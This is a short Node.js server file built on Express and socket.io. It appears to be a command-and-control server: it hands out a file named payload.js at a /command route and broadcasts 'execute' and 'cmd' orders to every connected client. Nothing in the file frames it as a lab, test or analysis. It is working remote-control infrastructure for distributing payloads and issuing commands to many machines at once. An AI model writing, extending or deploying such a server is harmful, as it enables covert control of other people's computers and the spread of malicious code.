const express = require('express')
const app = express()
const fs = require('fs');
var server = require('http').Server(app);
var io = require('socket.io')(server);


app.get('/command', (request, response) => {
    response.download('./payload.js');
})

app.use(express.static(__dirname)); //  "public" off of current is root

io.on("connection", function (socket) {
    socket.on('create', function (client) {
        console.log(client)
    })
    socket.on('order', function (data, cb) {
        switch (data.option) {
            case 1:
                socket.broadcast.emit('execute', data)
                break;
            case 2:
                socket.broadcast.emit('cmd', data)
                break;
            default:
                break;
        }
        cb()
    });
    socket.on('exit', function (data) {
        console.log(data)
    });
    socket.on('message', function (data) {
        console.log(data)
    });
    socket.on('error', function (data) {
        console.log(data)
    });
});

server.listen(3000)